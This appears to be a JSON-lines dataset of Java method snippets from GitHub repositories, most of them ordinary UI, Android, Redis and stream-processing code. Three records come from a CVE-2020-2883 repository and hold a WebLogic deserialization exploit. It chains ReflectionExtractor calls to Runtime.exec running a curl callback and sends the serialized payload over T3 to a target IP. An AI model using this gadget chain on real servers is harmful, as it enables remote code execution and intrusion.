"https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/jr100/TakeSnapshotDialog.java", "stars": "4", "class_props": {"extends": "JDialog", "implements": null, "modifiers": ["public"]}}, {"id": 34810, "method_name": "getTA_comment", "class_name": "TakeSnapshotDialog", "params": [], "throws": null, "modifiers": ["private"], "return_type": "JTextArea", "snippet": "    private JTextArea getTA_comment() {\n        if (TA_comment == null) {\n            TA_comment = new JTextArea();\n            TA_comment.setBorder(new LineBorder(Color.black));\n        }\n        return TA_comment;\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/jr100/TakeSnapshotDialog.java", "stars": "4", "class_props": {"extends": "JDialog", "implements": null, "modifiers": ["public"]}}, {"id": 34811, "method_name": "getSP_comment", "class_name": "TakeSnapshotDialog", "params": [], "throws": null, "modifiers": ["private"], "return_type": "JScrollPane", "snippet": "    private JScrollPane getSP_comment() {\n        if (SP_comment == null) {\n            SP_comment = new JScrollPane();\n            SP_comment.setViewportView(getTA_comment());\n        }\n        return SP_comment;\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/jr100/TakeSnapshotDialog.java", "stars": "4", "class_props": {"extends": "JDialog", "implements": null, "modifiers": ["public"]}}, {"id": 34812, "method_name": "setSection", "class_name": "VipSection", "params": ["T"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSection(T section) {\n        this.section = section;\n        this.isPresent = section != null;\n    }", "url": "https://raw.githubusercontent.com/devwckd/wckd-vips/master/src/main/java/co/wckd/vips/entity/section/VipSection.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 34813, "method_name": "apply", "class_name": "VipSection", "params": ["Player", "VipType"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void apply(Player player, VipType type);\n\n}\n\n", "url": "https://raw.githubusercontent.com/devwckd/wckd-vips/master/src/main/java/co/wckd/vips/entity/section/VipSection.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 34814, "method_name": "setAdapter", "class_name": "LinearList", "params": ["Adapter"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setAdapter(Adapter adapter) {\n        if (mAdapter != null)\n            mAdapter.unregisterDataSetObserver(mObserver);\n\n        mAdapter = adapter;\n        mAdapter.registerDataSetObserver(mObserver);\n        mObserver.onChanged();\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/widget/LinearList.java", "stars": "4", "class_props": {"extends": "LinearLayout", "implements": null, "modifiers": ["public"]}}, {"id": 34815, "method_name": "setOnItemClickListener", "class_name": "LinearList", "params": ["OnClickListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setOnItemClickListener(OnClickListener onItemClickListener) {\n        mOnItemClickListener = onItemClickListener;\n    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/widget/LinearList.java", "stars": "4", "class_props": {"extends": "LinearLayout", "implements": null, "modifiers": ["public"]}}, {"id": 34816, "method_name": "onChanged", "class_name": "Observer", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void onChanged() {\n            List<View> oldViews = new ArrayList<>(mContext.getChildCount());\n\n            for (int i = 0; i < mContext.getChildCount(); i++)\n                oldViews.add(mContext.getChildAt(i));\n\n            Iterator<View> iter = oldViews.iterator();\n\n            mContext.removeAllViews();\n\n            for (int i = 0; i < mContext.mAdapter.getCount(); i++) {\n                View convertView = iter.hasNext() ? iter.next() : null;\n                convertView = mContext.mAdapter.getView(i, convertView, mContext);\n                convertView.setOnClickListener(mOnItemClickListener);\n                mContext.addView(convertView);\n            }\n\n            super.onChanged();\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/widget/LinearList.java", "stars": "4", "class_props": {"extends": "DataSetObserver", "implements": null, "modifiers": ["private"]}}, {"id": 34817, "method_name": "onInvalidated", "class_name": "Observer", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void onInvalidated() {\n            mContext.removeAllViews();\n            super.onInvalidated();\n        }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/mobile/src/main/java/butter/droid/widget/LinearList.java", "stars": "4", "class_props": {"extends": "DataSetObserver", "implements": null, "modifiers": ["private"]}}, {"id": 34818, "method_name": "display", "class_name": "FadeInBitmapDisplayer", "params": ["Bitmap", "ImageView", "LoadedFrom"], "throws": null, "modifiers": ["public"], "return_type": "Bitmap", "snippet": "\tpublic Bitmap display(Bitmap bitmap, ImageView imageView, LoadedFrom loadedFrom) {\n\t\timageView.setImageBitmap(bitmap);\n\n\t\tanimate(imageView, durationMillis);\n\n\t\treturn bitmap;\n\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Android-Universal-Image-Loader-master/library/src/com/nostra13/universalimageloader/core/display/FadeInBitmapDisplayer.java", "stars": "74", "class_props": {"extends": null, "implements": ["BitmapDisplayer"], "modifiers": ["public"]}}, {"id": 34819, "method_name": "animate", "class_name": "FadeInBitmapDisplayer", "params": ["ImageView", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void animate(ImageView imageView, int durationMillis) {\n\t\tAlphaAnimation fadeImage = new AlphaAnimation(0, 1);\n\t\tfadeImage.setDuration(durationMillis);\n\t\tfadeImage.setInterpolator(new DecelerateInterpolator());\n\t\timageView.startAnimation(fadeImage);\n\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/Android-Universal-Image-Loader-master/library/src/com/nostra13/universalimageloader/core/display/FadeInBitmapDisplayer.java", "stars": "74", "class_props": {"extends": null, "implements": ["BitmapDisplayer"], "modifiers": ["public"]}}, {"id": 34820, "method_name": "run", "class_name": "CacheManagerCheck", "params": ["String"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void run(String... strings) throws Exception {\n\t\tlogger.info(\"\\n\\n=========================================================\\nUsing cache manager: \"\n\t\t\t\t+ this.cacheManager.getClass().getName() + \"\\n\"\n\t\t\t\t+ \"=========================================================\\n\\n\");\n\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-cache/src/main/java/smoketest/cache/CacheManagerCheck.java", "stars": "47572", "class_props": {"extends": null, "implements": ["CommandLineRunner"], "modifiers": ["public"]}}, {"id": 34821, "method_name": "press", "class_name": "AxisDialogKeyProcessor", "params": ["ComponentStatus"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void press(ComponentStatus status) {\n        if (status.getStatus() == ComponentStatus.STATUS_UNUSED) {\n            return ;\n        }\n        int index = status.getIndex();\n        if (index < buttons.length && buttons[index] != null) {\n            buttons[index].setBackground(Color.ORANGE);\n        }\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/device/gamepad/AxisDialogKeyProcessor.java", "stars": "4", "class_props": {"extends": "AxisKeyProcessor", "implements": null, "modifiers": ["public"]}}, {"id": 34822, "method_name": "release", "class_name": "AxisDialogKeyProcessor", "params": ["ComponentStatus"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void release(ComponentStatus status) {\n        if (status.getStatus() == ComponentStatus.STATUS_UNUSED) {\n            return ;\n        }\n        int index = status.getIndex();\n        if (index < buttons.length && buttons[index] != null) {\n            buttons[index].setBackground(Color.LIGHT_GRAY);\n        }\n    }", "url": "https://raw.githubusercontent.com/kemusiro/jr100-emulator-v2/master/src/jp/asamomiji/emulator/device/gamepad/AxisDialogKeyProcessor.java", "stars": "4", "class_props": {"extends": "AxisKeyProcessor", "implements": null, "modifiers": ["public"]}}, {"id": 34823, "method_name": "set", "class_name": "RedisServiceImpl", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void set(String key, String value) {\n        stringRedisTemplate.opsForValue().set(key, value);\n    }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/security-jwt/src/main/java/com/yyj/security/service/impl/RedisServiceImpl.java", "stars": "2", "class_props": {"extends": null, "implements": ["RedisService"], "modifiers": ["public"]}}, {"id": 34824, "method_name": "get", "class_name": "RedisServiceImpl", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String get(String key) {\n        return stringRedisTemplate.opsForValue().get(key);\n    }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/security-jwt/src/main/java/com/yyj/security/service/impl/RedisServiceImpl.java", "stars": "2", "class_props": {"extends": null, "implements": ["RedisService"], "modifiers": ["public"]}}, {"id": 34825, "method_name": "expire", "class_name": "RedisServiceImpl", "params": ["String", "long"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean expire(String key, long expire) {\n        return stringRedisTemplate.expire(key, expire, TimeUnit.SECONDS);\n    }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/security-jwt/src/main/java/com/yyj/security/service/impl/RedisServiceImpl.java", "stars": "2", "class_props": {"extends": null, "implements": ["RedisService"], "modifiers": ["public"]}}, {"id": 34826, "method_name": "remove", "class_name": "RedisServiceImpl", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void remove(String key) {\n        stringRedisTemplate.delete(key);\n    }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/security-jwt/src/main/java/com/yyj/security/service/impl/RedisServiceImpl.java", "stars": "2", "class_props": {"extends": null, "implements": ["RedisService"], "modifiers": ["public"]}}, {"id": 34827, "method_name": "increment", "class_name": "RedisServiceImpl", "params": ["String", "long"], "throws": null, "modifiers": ["public"], "return_type": "Long", "snippet": "    public Long increment(String key, long delta) {\n        return stringRedisTemplate.opsForValue().increment(key,delta);\n    }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/security-jwt/src/main/java/com/yyj/security/service/impl/RedisServiceImpl.java", "stars": "2", "class_props": {"extends": null, "implements": ["RedisService"], "modifiers": ["public"]}}, {"id": 34828, "method_name": "SpatialKNNQuery", "class_name": "KNNQuery", "params": ["DataStream<Point>", "Point", "Integer", "int", "int", "UniformGrid"], "throws": ["IOException"], "modifiers": ["public", "static"], "return_type": "DataStream<PriorityQueue>", "snippet": "    public static DataStream<PriorityQueue<Tuple2<Point, Double>>> SpatialKNNQuery(DataStream<Point> pointStream, Point queryPoint, Integer k, int windowSize, int windowSlideStep, UniformGrid uGrid) throws IOException {\n\n        // Control tuple oID = -99999\n        IterativeStream<Point> iterativeKeyedStream = pointStream.iterate();\n\n        // Iteration Body\n        DataStream<Point> filteredStream = iterativeKeyedStream.filter(new FilterFunction<Point>() {\n\n            int filterationNeighboringLayers = 0;\n            double queryRadiusMultFactor = 1.5;\n            ArrayList<Integer> queryCellIndices = HelperClass.getIntCellIndices(queryPoint.gridID);\n\n            @Override\n            public boolean filter(Point p) throws Exception {\n\n                // Recompute filterationCellsSet on the arrival of control tuple\n                if(p.gridID.equals(\"9999999999\")){\n                    filterationNeighboringLayers = uGrid.getCandidateNeighboringLayers(p.point.getX() * queryRadiusMultFactor);\n                    //System.out.println(\"Received feedback tuple\");\n                    return false;\n                }\n\n                // Filtering out the kNN out of range tuples\n                if(filterationNeighboringLayers == 0){\n                    return true;\n                }\n                else {\n                    ArrayList<Integer> pointCellIndices = HelperClass.getIntCellIndices(p.gridID);\n                    return (HelperClass.pointWithinQueryRange(pointCellIndices, queryCellIndices, filterationNeighboringLayers));\n                }\n            }\n        });\n\n        DataStream<PriorityQueue<Tuple2<Point, Double>>> windowedIterativeStream = filteredStream\n                .keyBy(\"gridID\")\n                .window(SlidingProcessingTimeWindows.of(Time.seconds(windowSize),Time.seconds(windowSlideStep)))\n                .apply(new WindowFunction<Point, PriorityQueue<Tuple2<Point, Double>>, Tuple, TimeWindow>() {\n\n                    PriorityQueue<Tuple2<Point, Double>> kNNPQ = new PriorityQueue<Tuple2<Point, Double>>(k, new SpatialDistanceComparator(queryPoint));\n\n                    @Override\n                    public void apply(Tuple tuple, TimeWindow timeWindow, Iterable<Point> inputTuples, Collector<PriorityQueue<Tuple2<Point, Double>>> outputStream) throws Exception {\n                        kNNPQ.clear();\n\n                        for (Point p : inputTuples) {\n\n                            if (kNNPQ.size() < k) {\n                                double distance = HelperClass.computeEuclideanDistance(p.point.getX(), p.point.getY(), queryPoint.point.getX(), queryPoint.point.getY());\n                                kNNPQ.offer(new Tuple2<Point, Double>(p, distance));\n                            } else {\n                                double distance = HelperClass.computeEuclideanDistance(p.point.getX(), p.point.getY(), queryPoint.point.getX(), queryPoint.point.getY());\n                                double largestDistInPQ = HelperClass.computeEuclideanDistance(kNNPQ.peek().f0.point.getX(), kNNPQ.peek().f0.point.getY(), queryPoint.point.getX(), queryPoint.point.getY());\n\n                                if (largestDistInPQ > distance) { // remove element with the largest distance and add the new element\n                                    kNNPQ.poll();\n                                    kNNPQ.offer(new Tuple2<Point, Double>(p, distance));\n                                }\n                            }\n                        }\n\n                        // Output stream\n                        outputStream.collect(kNNPQ);\n                    }\n                });\n\n        // windowAll to Generate integrated kNN -\n        DataStream<PriorityQueue<Tuple2<Point, Double>>> windowAllIterativeStream = windowedIterativeStream\n                .windowAll(SlidingProcessingTimeWindows.of(Time.seconds(windowSize),Time.seconds(windowSlideStep)))\n                .apply(new AllWindowFunction<PriorityQueue<Tuple2<Point, Double>>, PriorityQueue<Tuple2<Point, Double>>, TimeWindow>() {\n\n                    PriorityQueue<Tuple2<Point, Double>> kNNPQWinAll = new PriorityQueue<Tuple2<Point, Double>>(k, new SpatialDistanceComparator(queryPoint));\n                    PriorityQueue<Tuple2<Point, Double>> controlPQ = new PriorityQueue<Tuple2<Point, Double>>(k, new SpatialDistanceComparator(queryPoint));\n\n\n                    @Override\n                    public void apply(TimeWindow timeWindow, Iterable<PriorityQueue<Tuple2<Point, Double>>> input, Collector<PriorityQueue<Tuple2<Point, Double>>> output) throws Exception {\n\n                       kNNPQWinAll.clear();\n\n                       // Iterate through all PriorityQueues\n                       for (PriorityQueue<Tuple2<Point, Double>> pq : input) {\n                           for(Tuple2<Point, Double> pqTuple: pq) {\n                               if (kNNPQWinAll.size() < k) {\n                                   kNNPQWinAll.offer(pqTuple);\n                               }\n                               else{\n                                   double largestDistInkNNPQ = kNNPQWinAll.peek().f1;\n                                   if(largestDistInkNNPQ > pqTuple.f1){ // remove element with the largest distance and add the new element\n                                       kNNPQWinAll.poll();\n                                       kNNPQWinAll.offer(pqTuple);\n                                   }\n                               }\n                           }\n                       }\n\n                       // Adding the windowedAll output\n                       output.collect(kNNPQWinAll);\n\n                        // Adding the control tuple\n                        double largestDistInkNNPQ = kNNPQWinAll.peek().f1;\n                        //Point feedbackTuple = new Point(-99999, largestDistInkNNPQ, largestDistInkNNPQ, \"9999999999\" );\n                        Point feedbackTuple = new Point(largestDistInkNNPQ, largestDistInkNNPQ, \"9999999999\" );\n                        controlPQ.offer(new Tuple2<Point, Double>(feedbackTuple, -99999.99999));\n\n                        output.collect(controlPQ);\n                    }\n                   });\n\n\n\n        // Assuming that the distance between two objects is always >= 0\n        // Feedback\n        DataStream<Point> feedbackStream = windowAllIterativeStream.flatMap(new FlatMapFunction<PriorityQueue<Tuple2<Point, Double>>, Point>() {\n            @Override\n            public void flatMap(PriorityQueue<Tuple2<Point, Double>> inputStream, Collector<Point> outputStream) throws Exception {\n                // If the control tuple exists\n                if(inputStream.peek().f1 < 0){\n                    outputStream.collect(inputStream.peek().f0);\n                }\n            }\n        });\n\n        iterativeKeyedStream.closeWith(feedbackStream);\n        //Output\n        return windowAllIterativeStream.filter(new FilterFunction<PriorityQueue<Tuple2<Point, Double>>>() {\n            @Override\n            public boolean filter(PriorityQueue<Tuple2<Point, Double>> inputTuple) throws Exception {\n                return (inputTuple.peek().f1 >= 0);\n            }\n        });\n    }", "url": "https://raw.githubusercontent.com/aistairc/GeoFlink/master/src/main/java/GeoFlink/spatialOperators/KNNQuery.java", "stars": "2", "class_props": {"extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"id": 34829, "method_name": "main", "class_name": "CVE_2020_2883", "params": ["String"], "throws": ["Exception"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) throws Exception {\n        ReflectionExtractor reflectionExtractor1 = new ReflectionExtractor(\"getMethod\", new Object[]{\"getRuntime\", new Class[]{}});\n        ReflectionExtractor reflectionExtractor2 = new ReflectionExtractor(\"invoke\", new Object[]{null, new Object[]{}});        //ReflectionExtractor reflectionExtractor3 = new ReflectionExtractor(\"exec\", new Object[]{new String[]{\"calc\"}});\n        ReflectionExtractor reflectionExtractor3 = new ReflectionExtractor(\"exec\", new Object[]{new String[]{\"/bin/bash\", \"-c\", \"curl http://172.16.1.1/success\"}});\n\n        ValueExtractor[] valueExtractors = new ValueExtractor[]{\n                reflectionExtractor1,\n                reflectionExtractor2,\n                reflectionExtractor3,\n        };\n\n        Class clazz = ChainedExtractor.class.getSuperclass();\n        Field m_aExtractor = clazz.getDeclaredField(\"m_aExtractor\");\n        m_aExtractor.setAccessible(true);\n\n        ReflectionExtractor reflectionExtractor = new ReflectionExtractor(\"toString\", new Object[]{});\n        ValueExtractor[] valueExtractors1 = new ValueExtractor[]{\n                reflectionExtractor\n        };\n\n        ChainedExtractor chainedExtractor1 = new ChainedExtractor(valueExtractors1);\n\n        PriorityQueue queue = new PriorityQueue(2, new ExtractorComparator(chainedExtractor1));\n        queue.add(\"1\");\n        queue.add(\"1\");\n        m_aExtractor.set(chainedExtractor1, valueExtractors);\n\n        Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, \"queue\");\n        queueArray[0] = Runtime.class;\n        queueArray[1] = \"1\";\n\n        // serialize\n        byte[] payload = Serializables.serialize(queue);\n\n        // T3 send, you can also use python weblogic_t3.py test.ser\n        T3ProtocolOperation.send(\"172.16.1.130\", \"7001\", payload);\n\n        // test\n        serialize(queueArray);\n//        deserialize();\n\n    }", "url": "https://raw.githubusercontent.com/Y4er/CVE-2020-2883/master/CVE_2020_2883.java", "stars": "58", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34830, "method_name": "serialize", "class_name": "CVE_2020_2883", "params": ["Object"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void serialize(Object obj) {\n        try {\n            ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream(\"test.ser\"));\n            os.writeObject(obj);\n            os.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }", "url": "https://raw.githubusercontent.com/Y4er/CVE-2020-2883/master/CVE_2020_2883.java", "stars": "58", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34831, "method_name": "deserialize", "class_name": "CVE_2020_2883", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void deserialize() {\n        try {\n            ObjectInputStream is = new ObjectInputStream(new FileInputStream(\"test.ser\"));\n            is.readObject();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }", "url": "https://raw.githubusercontent.com/Y4er/CVE-2020-2883/master/CVE_2020_2883.java", "stars": "58", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34832, "method_name": "onCustomTabsServiceConnected", "class_name": "CustomTabsServiceConnectionImpl", "params": ["android", "android"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onCustomTabsServiceConnected (android.content.ComponentName p0, android.support.customtabs.CustomTabsClient p1)\n\t{\n\t\tn_onCustomTabsServiceConnected (p0, p1);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/crc64a98abb514ffad9f1/CustomTabsServiceConnectionImpl.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 34833, "method_name": "n_onCustomTabsServiceConnected", "class_name": "CustomTabsServiceConnectionImpl", "params": ["android", "android"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onCustomTabsServiceConnected (android.content.ComponentName p0, android.support.customtabs.CustomTabsClient p1);\n\n\n\tpublic void onServiceDisconnected (android.content.ComponentName p0)\n\t{\n\t\tn_onServiceDisconnected (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/crc64a98abb514ffad9f1/CustomTabsServiceConnectionImpl.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 34834, "method_name": "onServiceDisconnected", "class_name": "CustomTabsServiceConnectionImpl", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onServiceDisconnected (android.content.ComponentName p0)\n\t{\n\t\tn_onServiceDisconnected (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/crc64a98abb514ffad9f1/CustomTabsServiceConnectionImpl.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 34835, "method_name": "n_onServiceDisconnected", "class_name": "CustomTabsServiceConnectionImpl", "params": ["android"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onServiceDisconnected (android.content.ComponentName p0);\n\n\tprivate java.util.ArrayList refList;\n\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/crc64a98abb514ffad9f1/CustomTabsServiceConnectionImpl.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 34836, "method_name": "monodroidAddReference", "class_name": "CustomTabsServiceConnectionImpl", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/crc64a98abb514ffad9f1/CustomTabsServiceConnectionImpl.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 34837, "method_name": "monodroidClearReferences", "class_name": "CustomTabsServiceConnectionImpl", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\n\t{\n\t\tif (refList != null)\n\t\t\trefList.clear ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/crc64a98abb514ffad9f1/CustomTabsServiceConnectionImpl.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 34838, "method_name": "drawFlower", "class_name": "Drawer2D", "params": ["GraphicsContext", "Flower"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void drawFlower(GraphicsContext gc, Flower flower) {\n        //a flower is represented by a circle, filled with the proper color and a black border\n        gc.setFill(Paint.valueOf(flower.getDNA().getColor().toString()));\n        gc.setStroke(Paint.valueOf(\"#000000\"));\n        gc.setLineWidth(2);\n        gc.fillOval(\n                flower.getPos().x,\n                flower.getPos().y,\n                FLOWER_SIZE,\n                FLOWER_SIZE\n        );\n        gc.strokeOval(\n                flower.getPos().x,\n                flower.getPos().y,\n                FLOWER_SIZE,\n                FLOWER_SIZE\n        );\n    }", "url": "https://raw.githubusercontent.com/AndreaRiboni/Garden/master/src/flower_field/Drawer2D.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34839, "method_name": "give", "class_name": "Stacks", "params": ["Player", "ItemStack"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void give(Player player, ItemStack stack) {\n\n        if (player.getInventory().firstEmpty() == -1) {\n            player.getWorld().dropItemNaturally(player.getLocation().add(0, 1, 0), stack);\n            return;\n        }\n        player.getInventory().addItem(stack);\n\n    }", "url": "https://raw.githubusercontent.com/devwckd/wckd-vips/master/src/main/java/co/wckd/vips/util/Stacks.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34840, "method_name": "getMsgDS", "class_name": "AbstractEventCheck", "params": ["Properties", "Logger"], "throws": null, "modifiers": [], "return_type": "DataSource", "snippet": "    DataSource getMsgDS(Properties props, Logger log){\n        if (msgDS == null) {\n            msgDS = WBDruidFactory.getMsgInstance(props, log);\n            if (msgDS == null) {\n                log.error(\"Error getting Druid DataSource instance\");\n            }\n        }\n        return msgDS;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/eventcheck/AbstractEventCheck.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventCheckAdapter"], "modifiers": ["public", "abstract"]}}, {"id": 34841, "method_name": "initECParams", "class_name": "AbstractEventCheck", "params": ["Properties"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void initECParams(Properties props){\n        topic = props.getProperty(EventChecker.TOPIC);\n        msgName = props.getProperty(EventChecker.MSGNAME);\n        receiver = props.getProperty(EventChecker.RECEIVER);\n        sender = props.getProperty(EventChecker.SENDER);\n        msg = props.getProperty(EventChecker.MSG);\n        receiveToday = props.getProperty(EventChecker.TODAY);\n        userTime = props.getProperty(EventChecker.USER_TIME);\n        waitTime = props.getProperty(EventChecker.WAIT_TIME, \"1\");\n        query_frequency = props.getProperty(EventChecker.QUERY_FREQUENCY, \"5\");\n        wait_for_time = props.getProperty(EventChecker.WAIT_FOR_TIME);\n        afterSend = props.getProperty(EventChecker.AFTERSEND);\n        trigger_time = props.getProperty(EventChecker.TRIGGER_TIME);\n        trigger_param = props.getProperty(EventChecker.TRIGGER_PARAM);\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/eventcheck/AbstractEventCheck.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventCheckAdapter"], "modifiers": ["public", "abstract"]}}, {"id": 34842, "method_name": "getEventCheckerConnection", "class_name": "AbstractEventCheck", "params": ["Properties", "Logger"], "throws": null, "modifiers": [], "return_type": "Connection", "snippet": "    Connection getEventCheckerConnection(Properties props, Logger log){\n        Connection connection = null;\n        try {\n            connection =  getMsgDS(props,log).getConnection();\n        } catch (SQLException e) {\n            throw new RuntimeException(\"Error getting DB Connection instance {} \" + e);\n        }\n        return connection;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/eventcheck/AbstractEventCheck.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventCheckAdapter"], "modifiers": ["public", "abstract"]}}, {"id": 34843, "method_name": "sendMsg", "class_name": "AbstractEventCheck", "params": ["int", "Properties", "Logger"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean sendMsg(int jobId, Properties props, Logger log) {\n        return false;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/eventcheck/AbstractEventCheck.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventCheckAdapter"], "modifiers": ["public", "abstract"]}}, {"id": 34844, "method_name": "reciveMsg", "class_name": "AbstractEventCheck", "params": ["int", "Properties", "Logger"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean reciveMsg(int jobId, Properties props, Logger log) {\n        return false;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/eventcheck/AbstractEventCheck.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventCheckAdapter"], "modifiers": ["public", "abstract"]}}, {"id": 34845, "method_name": "closeConnection", "class_name": "AbstractEventCheck", "params": ["Connection", "Logger"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void closeConnection(Connection conn, Logger log) {\n        if (conn != null) {\n            try {\n                conn.close();\n            } catch (SQLException e) {\n                log.error(\"Error closing connection\", e);\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/eventcheck/AbstractEventCheck.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventCheckAdapter"], "modifiers": ["public", "abstract"]}}, {"id": 34846, "method_name": "closeQueryRef", "class_name": "AbstractEventCheck", "params": ["ResultSet", "Logger"], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void closeQueryRef(ResultSet rs, Logger log) {\n        if (rs != null) {\n            try {\n                rs.close();\n            } catch (SQLException e) {\n                log.error(\"Error closing result set\", e);\n            }\n        }\n\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-jobtype/src/main/java/com/webank/wedatasphere/schedulis/eventcheck/AbstractEventCheck.java", "stars": "18", "class_props": {"extends": null, "implements": ["EventCheckAdapter"], "modifiers": ["public", "abstract"]}}, {"id": 34847, "method_name": "closeQueryStmt", "class_name": "AbstractEventCheck", "params": ["PreparedStatement", "Logger"], "throws": null, 